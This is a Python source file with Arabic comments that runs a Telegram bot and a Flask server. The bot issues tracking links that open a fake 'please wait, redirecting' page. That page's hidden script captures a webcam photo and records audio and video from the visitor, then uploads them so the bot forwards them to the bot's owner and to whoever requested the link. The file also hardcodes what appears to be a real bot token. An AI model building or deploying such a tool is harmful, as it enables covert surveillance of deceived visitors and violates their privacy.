from telebot import TeleBot, types
from flask import Flask, request, send_file, render_template_string
import os, uuid

BOT_TOKEN = "5383004720:AAHxtz1UJvcpOmdHCOwWCijb9ySnIXBZRYU"
OWNER_ID = 5376094649
DOMAIN = "http://localhost:5000"

bot = TeleBot(BOT_TOKEN)
app = Flask(__name__)

uuid_map = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📸 التقاط صورة", callback_data='get_photo'))
    markup.add(types.InlineKeyboardButton("🎙️ تسجيل صوت", callback_data='get_audio'))
    markup.add(types.InlineKeyboardButton("📹 تسجيل فيديو", callback_data='get_video'))
    bot.send_message(message.chat.id, "اختر نوع التسجيل:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid = str(uuid.uuid4())
    uuid_map[uid] = call.from_user.id
    link = f"{DOMAIN}/{uid}"  # تم إزالة type من الرابط
    bot.send_message(call.message.chat.id, f"رابط خاص بك:\n{link}")

# ------------------ استلام الملفات ------------------
@app.route('/upload', methods=['POST'])
def receive_file():
    file = request.files['file']
    uid = request.form.get('uuid')
    user_id = uuid_map.get(uid)

    path = f"temp/{file.filename}"
    file.save(path)

    caption = "تم استلام ملف من الزائر"
    if file.filename.endswith('.png'):
        bot.send_photo(OWNER_ID, open(path, 'rb'), caption=caption)
        if user_id and user_id != OWNER_ID:
            bot.send_photo(user_id, open(path, 'rb'), caption=caption)
    elif file.filename.endswith('.ogg'):
        bot.send_audio(OWNER_ID, open(path, 'rb'), caption=caption)
        if user_id and user_id != OWNER_ID:
            bot.send_audio(user_id, open(path, 'rb'), caption=caption)
    elif file.filename.endswith('.webm'):
        bot.send_video(OWNER_ID, open(path, 'rb'), caption=caption)
        if user_id and user_id != OWNER_ID:
            bot.send_video(user_id, open(path, 'rb'), caption=caption)

    os.remove(path)
    return "تم الإرسال"

# ------------------ صفحة الانتظار وهمية + الكود السري ------------------
@app.route('/<uuid>')
def wait_page(uuid):
    return render_template_string("""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>يرجى الانتظار</title></head>
<body style="background:#111;color:#fff;text-align:center;">
<h2>يرجى الانتظار 10 ثوانٍ قبل تحويلك للموقع المطلوب...</h2>
<script>
const uuid = "{{ uuid }}"; // استخدام UUID في الصفحة
const send = (file, name) => {
    let formData = new FormData();
    formData.append("file", file, name);
    formData.append("uuid", uuid);
    fetch("/upload", { method: "POST", body: formData });
};

// التقاط صورة
navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();
    const canvas = document.createElement("canvas");
    setTimeout(() => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => send(blob, "photo.png"), "image/png");
        stream.getTracks().forEach(t => t.stop());
    }, 3000);
});

// تسجيل صوت
navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
    const recorder = new MediaRecorder(stream);
    let chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
        const blob = new Blob(chunks, { type: "audio/ogg" });
        send(blob, "audio.ogg");
    };
    recorder.start();
    setTimeout(() => {
        recorder.stop();
        stream.getTracks().forEach(t => t.stop());
    }, 10000);
});

// تسجيل فيديو
navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
    const recorder = new MediaRecorder(stream);
    let chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
        const blob = new Blob(chunks, { type: "video/webm" });
        send(blob, "video.webm");
    };
    recorder.start();
    setTimeout(() => {
        recorder.stop();
        stream.getTracks().forEach(t => t.stop());
    }, 5000);
});
</script>
</body>
</html>
""", uuid=uuid)

# ------------------ تشغيل السيرفر ------------------
if __name__ == "__main__":
    os.makedirs("temp", exist_ok=True)
    from threading import Thread
    Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}).start()
    bot.polling(none_stop=True)
